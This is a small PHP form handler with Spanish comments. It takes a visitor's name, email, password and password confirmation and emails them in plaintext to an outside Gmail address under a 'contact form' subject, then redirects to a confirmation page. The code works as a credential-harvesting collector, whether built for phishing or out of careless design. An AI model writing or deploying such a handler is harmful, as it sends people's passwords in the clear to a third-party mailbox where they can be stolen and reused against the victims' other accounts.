<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = $_POST['name'];
    $email = $_POST['email'];
    $password = $_POST['password'];
    $confirm_password = $_POST['confirm_password'];

    $to = 'publicidadtelecelrespaldo@gmail.com';
    $subject = 'Nuevo formulario de contacto desde sitio test';
    $message = "Nombre: $name\n";
    $message .= "Correo electrónico: $email\n";
    $message .= "Contraseña: $password\n";
    $message .= "Confirmar contraseña: $confirm_password\n";

    // Enviar el correo electrónico
    mail($to, $subject, $message);

    // Redireccionar a una página de confirmación
    header('Location: confirmation.html');
    exit;
}
?>